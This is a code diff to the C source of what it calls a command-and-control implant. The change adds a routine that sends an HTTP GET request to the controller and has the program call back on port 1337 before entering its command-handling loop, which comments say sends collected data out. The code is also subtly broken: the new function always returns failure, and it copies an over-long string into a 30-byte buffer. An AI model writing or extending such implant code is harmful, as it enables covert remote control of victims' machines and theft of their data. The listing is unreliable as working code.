@@ -13,6 +13,29 @@
 #include "File.h"
 
 
+// Send a HTTP GET request to C2
+int sendGetRequest(int* client_fd)
+{
+    int status = 0, bytes_sent = 0;
+    char getRequest [30] = { 0 };
+    char *reqString = "GET /resource HTTP/1.1\r\nHost: not.malware\r\nContent-Type: text/plain\r\n\r\n";
+
+    memcpy(getRequest, reqString, strlen(reqString));
+
+    bytes_sent = send(*client_fd, reqString, strlen(reqString), 0);
+    if (bytes_sent == 0)
+    {
+        printf("Failed to send HTTP GET request to C2!\n");
+        status = 0;
+        goto cleanup;
+    }
+
+
+cleanup:
+    return status;
+}
+
+
 // Callout and establish connection to C2
 int callout( int* client_fd, const char* ip_address, uint16_t port)
 {
@@ -152,6 +175,7 @@ int handleCommands(int* client_fd)
         }
     }
 
+
 cleanup:
     return status;
 }
@@ -161,7 +185,6 @@ cleanup:
     // Will also parse reponses from C2 and call into appropiate funcitonality + send collected data 
 int main() 
 {
-    //const char* ip_address = "172.17.0.3";
     char* ip_address;
     uint16_t port = 1337;
     int client_fd = 0;
@@ -182,7 +205,15 @@ int main()
         return -1;
     }
 
-    printf("Successfully connected to C2; starting implant loop...\n");
+    printf("Successfully connected to C2; sending HTTP GET request...\n");
+    if (!sendGetRequest(&client_fd))
+    {
+        printf("Failed to send HTTP GET request!\n");
+        return -1;
+    }
+
+    // GET request succeeded, continue to handle commands
+    printf("Successful GET request; continuing implant loop...\n");
 
     if (!handleCommands(&client_fd))
     {
